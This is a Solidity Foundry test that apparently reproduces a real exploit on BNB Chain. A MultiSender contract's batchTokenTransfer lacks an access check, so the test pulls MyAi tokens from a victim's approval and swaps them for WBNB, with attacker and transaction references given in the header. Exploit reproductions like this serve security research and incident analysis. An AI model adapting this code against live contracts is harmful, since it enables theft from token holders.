// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~10 $BNB
// Attacker : hhttps://bscscan.com/address/0xc47fcc9263b026033a94574ec432514c639a2d12
// Attack Contract : https://bscscan.com/address/0x0d3aafb9ade835456b2595509ac1f58922e465b3
// Vulnerable Contract : https://bscscan.com/address/0xdb103fd28ca4b18115f5ce908baaeed7e0f1f101
// Attack Tx : https://bscscan.com/tx/0x346f65ac333eb6d69886f5614aaf569a561a53a8d93db4384bd7c0bec15ae9f6

import "forge-std/Test.sol";
import "./../interface.sol";

interface IMultiSender {
    function batchTokenTransfer(
        address _from,
        address[] memory _address,
        uint256[] memory _amounts,
        address token,
        uint256 totalAmount,
        bool isToken
    ) external payable;
}

contract ContractTest is Test {
    IERC20 MyAi = IERC20(0x40d1E011669c0dc7Dc7c7Fb93E623d6A661Df5Ee);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakeRouter PancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IMultiSender MultiSender = IMultiSender(0xDb103fd28Ca4B18115F5Ce908baaeed7E0f1f101);
    address Victim = 0x003B724f9e1fa7350A7723BB8313ACBDbE7188CB;

    function setUp() public {
        vm.createSelectFork("bsc", 29_554_344 - 1);
        vm.label(address(WBNB), "WBNB");
        vm.label(address(MyAi), "MyAi");
        vm.label(address(MultiSender), "MultiSender");
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker WBNB balance before attack", WBNB.balanceOf(address(this)), 18);
        MyAi.approve(address(PancakeRouter), type(uint256).max);
        MyAi.approve(address(MultiSender), type(uint256).max);

        address[] memory Attack = new address[](100);
        for (uint256 i = 0; i < Attack.length; i++) {
            Attack[i] = address(this);
        }
        uint256[] memory Token = new uint256[](100);
        for (uint256 i = 0; i < Attack.length; i++) {
            Token[i] = 999_999_999_999_400;
        }

        MultiSender.batchTokenTransfer{value: 1 ether}(Victim, Attack, Token, address(MyAi), 999_999_999_999_400 * 100, true);
        for (uint256 i = 0; i < 100; i++) {
            TOKENToWBNB();
        }
        emit log_named_decimal_uint("Attacker WBNB balance before attack", WBNB.balanceOf(address(this)), 18);
    }
    
    function TOKENToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(MyAi);
        path[1] = address(WBNB);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            999_999_999_999_400, 0, path, address(this), block.timestamp
        );
    }
    
    fallback() external payable {}
    receive() external payable {}
}
